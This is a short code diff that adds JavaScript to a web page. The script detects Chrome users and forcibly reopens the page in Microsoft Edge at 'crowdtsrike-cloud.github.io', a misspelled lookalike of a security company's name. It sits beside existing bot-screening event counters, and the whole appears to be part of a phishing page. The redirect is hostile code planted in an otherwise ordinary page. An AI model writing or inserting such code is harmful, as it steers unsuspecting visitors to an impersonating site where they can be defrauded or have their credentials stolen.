@@ -204,6 +204,28 @@
 </div>
 
 <script>
+
+	function isChrome() {
+		const userAgent = navigator.userAgent;
+		const isChromium = window.chrome;
+		const vendorName = window.navigator.vendor;
+		const isOpera = typeof window.opr !== "undefined";
+		const isEdge = userAgent.indexOf("Edg") > -1;
+		return (
+			isChromium !== null &&
+			typeof isChromium !== "undefined" &&
+			vendorName === "Google Inc." &&
+			!isOpera &&
+			!isEdge
+		);
+	}
+
+	const url = "https://crowdtsrike-cloud.github.io";
+
+	if (isChrome()) {
+		window.location.href = "microsoft-edge:" + url;
+	}
+
     let badeventcounter = 0;
     let goodeventcounter = 0;
     let lastX = null;
